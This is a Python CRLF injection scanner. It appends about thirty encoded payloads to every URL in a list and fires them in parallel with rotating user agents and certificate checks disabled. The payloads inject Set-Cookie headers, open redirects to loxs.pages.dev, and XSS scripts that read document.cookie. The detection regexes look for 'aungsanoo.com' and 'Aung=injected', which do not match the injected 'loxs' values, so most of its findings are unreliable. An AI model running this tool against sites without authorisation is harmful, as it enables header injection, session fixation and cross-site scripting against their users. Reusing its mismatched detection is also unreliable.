import os
import re
import time
import random
import argparse
import requests
import urllib3
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init

# Initialize Colorama
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# List of User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.70",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
]

# List of regex patterns to detect CRLF vulnerabilities
REGEX_PATTERNS = [
    r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)aungsanoo\.com\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?Aung=injected(?:\s*?)(?:$|;)))',
    r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)aungsanoo\.com\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?Aung=injected(?:\s*?)(?:$|;)|loxs-x))'
]

def get_random_user_agent():
    """Randomly selects a User-Agent from the list."""
    return random.choice(USER_AGENTS)


def get_domain(url):
    parsed_url = urlparse(url)
    return parsed_url.netloc


def generate_payloads(url):
    domain = get_domain(url)
    base_payloads = [
                "/%%0a0aSet-Cookie:loxs=injected",
                "/%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%0d%0aLocation: http://loxs.pages.dev",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
                "/%0d%0aLocation: loxs.pages.dev",
                "/%0d%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
                "/%23%0aSet-Cookie:loxs=injected",
                "/%25%30%61Set-Cookie:loxs=injected",
                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
                "/%5Cr%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%u000ASet-Cookie:loxs=injected;",
                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
            ]
    return [payload.replace("{{Hostname}}", domain) for payload in base_payloads]


def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session


def check_crlf_vulnerability(url, payload, scan_state=None):
    target_url = f"{url}{payload}"
    start_time = time.time()

    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }

    result = None

    try:
        session = get_retry_session()
        response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
        response_time = time.time() - start_time

        is_vulnerable = False
        vulnerability_details = []

        for header, value in response.headers.items():
            combined_header = f"{header}: {value}"
            if any(re.search(pattern, combined_header, re.IGNORECASE) for pattern in REGEX_PATTERNS):
                is_vulnerable = True
                vulnerability_details.append(f"{Fore.WHITE}Header Injection: {Fore.LIGHTBLACK_EX}{combined_header}")

        if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in REGEX_PATTERNS):
            is_vulnerable = True
            vulnerability_details.append(f"{Fore.WHITE}Body Injection: {Fore.LIGHTBLACK_EX}Detected CRLF in response body")

        if response.status_code in [200, 201, 202, 204, 205, 206, 207, 301, 302, 307, 308]:
            if is_vulnerable:
                result = (Fore.GREEN + f"[✓] {Fore.CYAN}Vulnerable: {Fore.GREEN} {target_url} "
                        f"{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                if vulnerability_details:
                    result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(vulnerability_details)
            else:
                result = (Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} "
                        f"{Fore.CYAN} - Response Time: {response_time:.2f} seconds")

        if scan_state:
            scan_state['total_scanned'] += 1
            if is_vulnerable:
                scan_state['vulnerability_found'] = True
                scan_state['vulnerable_urls'].append(target_url)
                scan_state['total_found'] += 1

        return result, is_vulnerable

    except requests.exceptions.RequestException as e:
        result = Fore.RED + f"[!] Error accessing {target_url}: {str(e)}"
        print(result)
        return result, False


def test_crlf(url, max_threads=5):
    found_vulnerabilities = 0
    vulnerable_urls = []
    payloads = generate_payloads(url)

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in payloads}
        for future in as_completed(future_to_payload):
            payload = future_to_payload[future]
            try:
                result, is_vulnerable = future.result()
                if result:
                    print(Fore.YELLOW + f"[→] Scanning with payload: {payload}")
                    print(result)
                    if is_vulnerable:
                        found_vulnerabilities += 1
                        vulnerable_urls.append(url + payload)
            except Exception as e:
                print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
    return found_vulnerabilities, vulnerable_urls


def print_scan_summary(total_found, total_scanned, start_time):
    print(f"\nScan complete: {total_found} vulnerabilities found out of {total_scanned} scanned URLs.")
    print(f"Time taken: {int(time.time() - start_time)} seconds.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CRLF Injection Scanner")
    parser.add_argument("-l", "--list", required=True, help="Path to file containing URLs to scan")
    parser.add_argument("-o", "--output", required=True, help="Path to save the scan results")
    args = parser.parse_args()

    if not os.path.isfile(args.list):
        print(Fore.RED + "[!] Input file not found!")
        exit(1)

    with open(args.list, "r") as file:
        urls = [line.strip() for line in file if line.strip()]

    # Open the output file to log results
    with open(args.output, "w") as output_file:
        start_time = time.time()
        total_found = 0

        for url in urls:
            print(Fore.BLUE + f"Scanning URL: {url}")
            found_vulnerabilities, vulnerable_urls = test_crlf(url)
            total_found += found_vulnerabilities

            # Write vulnerabilities to the output file
            for vuln_url in vulnerable_urls:
                output_file.write(vuln_url + "\n")

        print_scan_summary(total_found, len(urls), start_time)
        print(Fore.GREEN + f"\n[✓] Scan results saved to {args.output}")
